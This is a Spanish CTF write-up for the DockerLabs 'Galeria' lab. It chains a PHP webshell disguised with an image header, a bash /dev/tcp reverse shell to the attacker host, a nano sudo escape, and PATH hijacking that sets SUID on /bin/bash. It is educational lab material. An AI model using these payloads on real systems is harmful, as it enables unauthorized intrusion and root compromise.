@@ -1,0 +1,259 @@
+---
+title: Galeria
+description: Resolución completa de la máquina virtual *Galeria* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Galeria**, desarrollada por *Raul A* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con una funcionalidad de subida de archivos que carece de validación adecuada, permitiendo la subida de una webshell y obteniendo ejecución remota de comandos como `www-data`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `nano` como el usuario `gallery`, facilitando el movimiento lateral. Posteriormente, el usuario `gallery` puede ejecutar un binario `runme` como root, el cual es vulnerable a **PATH hijacking**, permitiendo la ejecución de código arbitrario y la escalada final a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Galeria',
+    Autor: 'Raul A',
+    Dificultad: 'Fácil',
+    Fecha: '13/05/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Galeria.zip
+sudo bash auto_deploy.sh Galeria.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Galeria/{content,exploits,nmap,scripts}
+cd Galeria
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761026537/Ports_rwhrhi.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1761026537/Gobuster_rdcvq5.png)
+
+**Rutas identificadas:**
+- `/index` — Página principal de la galería.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1761027638/Index_teqcg4.png)
+- `/gallery` — Galería de imágenes.
+  ![Gallery](https://res.cloudinary.com/dewqswzke/image/upload/v1761026536/galleryList_srxzeq.png)
+- `/handler.php` — Formulario de subida de archivos.
+  ![Handler.php](https://res.cloudinary.com/dewqswzke/image/upload/v1761026537/HandlerPhp_qdplrl.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de webshell
+
+El sistema no valida adecuadamente los archivos subidos, permitiendo la carga de archivos `.php` con contenido ejecutable.
+
+Se crea una webshell con encabezado de imagen para evadir validaciones superficiales:
+
+```php
+\xFF\xD8\xFF\xE0
+<?=`$_GET[0]`?>
+```
+
+Se sube el archivo como `shell.php` y se verifica su presencia:
+
+![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1761026539/Uploads_nnelhh.png)
+
+Se accede a la URL:
+
+```
+http://172.17.0.2/gallery/uploads/images/shell.php?0=id
+```
+
+Se obtiene ejecución remota de comandos (RCE):
+
+![Webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1761026539/WebShell_oadq4g.png)
+
+### 2.2 Reverse shell
+
+Se establece una reverse shell hacia la máquina atacante. Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se envía el payload (urlencodeado):
+
+```
+http://172.17.0.2/gallery/uploads/images/shell.php?0=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%22
+```
+
+![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1761026540/www-data_n8260b.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → gallery
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761026538/Sudo-l_jey8co.png)
+
+El usuario puede ejecutar `nano` como `gallery` sin contraseña.
+
+Se ejecuta `nano` para obtener una shell como `gallery`:
+
+```bash
+sudo -u gallery /bin/nano
+```
+
+Dentro de nano, se presiona `Ctrl+R`, luego `Ctrl+X`, y se escribe:
+
+```
+reset; sh 1>&0 2>&0
+```
+
+### 3.2 De gallery → root
+
+Se verifican nuevamente los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l gallery](https://res.cloudinary.com/dewqswzke/image/upload/v1761026538/Sudo-l2_vpx4po.png)
+
+El usuario puede ejecutar `/usr/local/bin/runme` como root.
+
+Al ejecutarlo:
+
+```bash
+sudo /usr/local/bin/runme
+```
+
+Se produce un error indicando que no encuentra el binario `convert`:
+
+![Error](https://res.cloudinary.com/dewqswzke/image/upload/v1761026536/Error_h9bgrl.png)
+
+Esto sugiere una **vulnerabilidad de PATH hijacking**. Se modifica el `PATH` para priorizar el directorio actual:
+
+```bash
+export PATH=/home/gallery:$PATH
+```
+
+Se crea un falso binario `convert`:
+
+```bash
+echo '#!/bin/bash
+chmod u+s /bin/bash' > /home/gallery/convert
+chmod +x /home/gallery/convert
+```
+
+Se ejecuta el binario vulnerable como root:
+
+```bash
+sudo /usr/local/bin/runme
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761026537/Root_vggi7t.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Subida de archivos sin validación adecuada",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en nano",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario gallery"
+    },
+    {
+      vulnerability: "PATH hijacking en binario runme ejecutado por root",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de validación de tipo MIME en subida de archivos",
+      severity: "Alta",
+      impact: "Subida de código ejecutable malicioso"
+    },
+    {
+      vulnerability: "Uso de rutas relativas en binarios ejecutados con privilegios",
+      severity: "Alta",
+      impact: "Ejecución de código arbitrario como root"
+    }
+  ]}
+/>
